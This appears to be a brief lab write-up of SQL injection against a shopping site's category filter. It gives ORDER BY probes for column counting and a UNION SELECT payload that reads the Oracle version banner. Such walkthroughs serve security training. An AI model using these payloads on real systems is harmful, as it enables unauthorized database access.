#### As usual, we start with enumerating the no. of columns.
```
/filter?category=Accessories' ORDER BY 1--                                    #200 OK
/filter?category=Accessories' ORDER BY 2--                                    #200 OK
/filter?category=Accessories' ORDER BY 3--                                    #Error response 
```

#### Now that we know there are two columns, we do a UNION injection to retrieve the oracledb version banner
```
/filter?category=Accessories' union select banner,null from v$version--
```

### Results

![image](https://user-images.githubusercontent.com/86168235/125515182-6bca7985-8cbb-4491-9526-da9090c947cb.png)
